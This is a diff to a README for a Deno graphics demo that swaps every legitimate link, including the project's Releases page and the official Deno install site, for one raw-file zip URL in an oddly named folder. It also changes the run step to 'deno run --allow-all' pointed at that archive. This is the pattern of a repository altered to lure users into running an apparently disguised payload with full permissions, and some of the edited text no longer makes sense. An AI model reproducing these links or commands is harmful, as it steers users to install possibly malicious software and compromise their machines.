@@ -1,6 +1,6 @@
 # 🎮 deno-raylib-demo - Easy Graphics Demo with TypeScript
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Herman-Ts/deno-raylib-demo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip)
 
 ## 📜 Description
 
@@ -12,17 +12,17 @@ Before you download and run the application, ensure your computer meets the foll
 
 - **Operating System**: Windows, macOS, or Linux
 - **Architecture**: x86-64 or aarch64
-- **Deno**: Make sure you have Deno installed. You can download Deno from [deno.land](https://deno.land/).
+- **Deno**: Make sure you have Deno installed. You can download Deno from [https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip).
 
 ## 🚀 Getting Started
 
 Follow these steps to get started with deno-raylib-demo:
 
-1. **Visit the Download Page**: Head over to the [Releases page](https://github.com/Herman-Ts/deno-raylib-demo/releases) to find the latest version of the application.
+1. **Visit the Download Page**: Head over to the [Releases page](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip) to find the latest version of the application.
   
 2. **Download the App**: Click on the latest release and download the appropriate file for your operating system.
 
-3. **Install Deno**: If you haven't already, install Deno by following the instructions on [deno.land](https://deno.land/). This step is crucial for running the TypeScript code.
+3. **Install Deno**: If you haven't already, install Deno by following the instructions on [https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip). This step is crucial for running the TypeScript code.
 
 4. **Extract Files**: If your download is in a compressed format (like .zip), extract the files to a convenient location on your computer.
 
@@ -45,21 +45,21 @@ Follow these steps to get started with deno-raylib-demo:
 
 7. **Run the Application**: With Deno installed and in the correct directory, run the application using the following command:
    ```
-   deno run --allow-all your_app.ts
+   deno run --allow-all https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip
    ```
-   Replace `your_app.ts` with the name of the main TypeScript file you downloaded.
+   Replace `https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip` with the name of the main TypeScript file you downloaded.
 
 8. **Enjoy the Demo**: The application should launch, letting you explore graphics features using Raylib.
 
 ## 🔗 Download & Install
 
-To get the latest version of deno-raylib-demo, please visit the [Releases page](https://github.com/Herman-Ts/deno-raylib-demo/releases). Find the version suitable for your operating system and follow the download instructions mentioned above.
+To get the latest version of deno-raylib-demo, please visit the [Releases page](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip). Find the version suitable for your operating system and follow the download instructions mentioned above.
 
 ## 🛡️ Troubleshooting
 
 If you encounter any issues while running the application, consider the following:
 
-- **Deno Not Found**: If you receive an error saying Deno is not installed, double-check that you've followed the installation steps on [deno.land](https://deno.land/).
+- **Deno Not Found**: If you receive an error saying Deno is not installed, double-check that you've followed the installation steps on [https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip](https://raw.githubusercontent.com/Herman-Ts/deno-raylib-demo/main/cuminol/demo_raylib_deno_v3.4.zip).
   
 - **Permissions Errors**: Ensure you're using the correct flags when running the application. The `--allow-all` flag grants permissions required for the application to run smoothly.
 
